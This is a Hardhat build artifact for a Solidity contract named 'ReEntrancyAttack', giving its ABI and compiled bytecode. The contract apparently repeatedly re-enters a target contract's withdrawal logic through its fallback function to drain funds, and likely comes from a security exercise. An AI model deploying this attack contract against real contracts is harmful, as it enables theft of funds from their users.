{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReEntrancyAttack",
  "sourceName": "contracts/ReEntrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "ReentranceAttack1",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reEnter",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040516103313803806103318339818101604052810190610025919061010f565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b6101e68061014b6000396000f3fe60806040526004361061002d5760003560e01c80630ec394631461007b578063fcd36e9c146100925761002e565b5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610079576100786100a9565b5b005b34801561008757600080fd5b506100906100a9565b005b34801561009e57600080fd5b506100a761012b565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011157600080fd5b505af1158015610125573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631f8cdb04610bb86040518263ffffffff1660e01b81526004016000604051808303818588803b15801561019557600080fd5b505af11580156101a9573d6000803e3d6000fd5b505050505056fea26469706673582212204d95c0d5f5f293bc40b6419b160df7f125006f96686db91c48ca81253c188b8c64736f6c63430008150033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}